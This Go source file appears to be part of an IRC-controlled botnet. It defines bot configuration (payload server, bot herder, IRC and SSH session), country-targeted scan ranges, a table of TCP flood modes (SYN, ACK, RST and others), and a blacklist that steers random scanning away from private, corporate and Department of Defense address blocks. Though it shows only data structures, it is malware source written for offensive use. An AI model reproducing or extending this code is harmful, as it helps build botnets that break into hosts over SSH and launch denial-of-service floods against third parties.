package lib

import (
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

type Bot struct {
	CPU               int
	payload, pServer  string //"pServer" = payload server
	password, network string
	Channel, ChanKey  string
	BotTag, BotHerder string
	scanNetwork       []string
	isRandom          bool
	IRC               net.Conn
	timeout           time.Duration
	session           *ssh.Client
}

type Attack struct {
	srcAddr, dstAddr, url                                string
	dstPort                                              string
	httpMethod, reqHeader                                string
	ddosPayload                                          []byte
	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
}

var ScanMap = map[string]Bot{
	"-cn": {
		scanNetwork: ChinaNetwork,
		isRandom:    false,
	},
	"-usa": {
		scanNetwork: AmericaNetwork,
		isRandom:    false,
	},
	"-kr": {
		scanNetwork: KoreaNetwork,
		isRandom:    false,
	},
	"-br": {
		scanNetwork: BrazilNetwork,
		isRandom:    false,
	},
	"-r": {
		scanNetwork: RandomNetwork,
		isRandom:    true,
	},
}

var TCPAttackMap = map[string]Attack{
	"-syn": {
		synFlag: true,
	},
	"-ack": {
		ackFlag: true,
	},
	"-rst": {
		rstFlag: true,
	},
	"-psh": {
		pshFlag: true,
	},
	"-fin": {
		finFlag: true,
	},
	"-urg": {
		urgFlag: true,
	},
}

/*
	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
	I don't recommend you to write map like this in Go, i do this because you know...
	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IP.
*/
var BlacklistIP = map[string]struct{}{
	/*
		Loopback
	*/
	"127.": {},

	/*
		General Electric Company
	*/
	"3.": {},

	/*
		Hewlett-Packard Company
	*/
	"15.": {}, "16.": {},

	/*
		US Postal Service
	*/
	"56.": {},

	/*
		Internal network
	*/
	"10.": {}, "192.": {}, "172.": {},

	/*
		NAT
	*/
	"100.": {}, "169.": {},

	/*
		Special use
	*/
	"198.": {},

	/*
		Multicast
	*/
	"224.": {},

	/*
		Department of Defense
	*/
	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {},
	"29.": {}, "30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
}
